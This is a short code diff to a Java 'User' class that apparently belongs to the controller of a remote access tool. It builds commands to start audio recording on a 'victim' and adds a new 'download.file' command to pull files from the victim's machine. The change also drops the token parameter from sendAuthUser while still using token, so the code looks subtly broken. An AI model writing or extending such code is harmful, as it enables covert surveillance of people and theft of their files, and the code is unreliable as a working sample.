@@ -75,7 +75,7 @@ public class User {
         sendMessage(query);
     }
 
-    public void sendAuthUser(String token) {
+    public void sendAuthUser() {
         JSONObject query = new JSONObject();
         query.put("action", "auth.user");
         query.put("token", token);
@@ -180,6 +180,15 @@ public class User {
         JSONObject query = new JSONObject();
         query.put("action", "start.audio.record");
         query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    public void sendDownloadFile(String filename, long port, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "download.file");
+        query.put("filename", filename);
+        query.put("port", port);
         query.put("victim", victim);
         sendMessage(query);
     }
